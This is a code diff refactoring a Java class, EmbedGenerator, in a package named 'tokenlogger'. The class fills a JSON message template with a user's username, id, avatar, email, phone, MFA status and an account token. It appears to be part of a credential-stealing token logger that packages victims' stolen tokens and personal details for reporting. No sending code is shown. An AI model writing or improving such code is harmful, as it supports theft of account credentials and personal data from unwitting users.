@@ -1,10 +1,10 @@
 package tokenlogger.utils;
 
-import java.io.InputStream;
-import java.io.InputStreamReader;
+import java.net.URL;
 import java.util.HashMap;
 import java.util.Map;
 
+import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.node.ObjectNode;
 
@@ -21,23 +21,19 @@ public class EmbedGenerator {
 
     public static String generateEmbed(String userInfoJson, String token) {
         try {
-            InputStream templateStream = EmbedGenerator.class.getResourceAsStream(TEMPLATE_PATH);
-            JsonNode templateNode = Json.getObjectMapper().readTree(new InputStreamReader(templateStream));
+            URL embedTemplate = EmbedGenerator.class.getResource(TEMPLATE_PATH);
+            JsonNode templateNode = Json.getObjectMapper().readTree(embedTemplate);
             Map<String, String> placeholders = createPlaceholders(userInfoJson, token);
             return populateTemplate(templateNode, placeholders).toString();
-        } catch (Exception ignored) {}
-
-        return null;
+        } catch (Exception e) {
+            return null;
+        }
     }
 
-    private static Map<String, String> createPlaceholders(String userInfoJson, String token) {
-        JsonNode userInfo = null;
-        try {
-            userInfo = Json.getObjectMapper().readTree(userInfoJson);
-        } catch (Exception ignored) {}
-
+    private static Map<String, String> createPlaceholders(String userInfoJson, String token) throws JsonProcessingException {
         Map<String, String> placeholders = new HashMap<>();
         String[] fields = {"username", "id", "avatar", "email", "phone", "mfa_enabled"};
+        JsonNode userInfo = Json.getObjectMapper().readTree(userInfoJson);
 
         for (String field : fields) {
             placeholders.put(field, get(userInfo, field));
@@ -55,17 +51,13 @@ public class EmbedGenerator {
         return valueNode != null ? valueNode.asText() : null;
     }
 
-    private static ObjectNode populateTemplate(JsonNode templateNode, Map<String, String> placeholders) {
+    private static ObjectNode populateTemplate(JsonNode templateNode, Map<String, String> placeholders) throws JsonProcessingException {
         String template = templateNode.toString();
 
         for (Map.Entry<String, String> entry : placeholders.entrySet()) {
             template = template.replace("%" + entry.getKey(), entry.getValue());
         }
 
-        try {
-            return Json.getObjectMapper().readValue(template, ObjectNode.class);
-        } catch (Exception ignored) {}
-
-        return null;
+        return Json.getObjectMapper().readValue(template, ObjectNode.class);
     }
 }
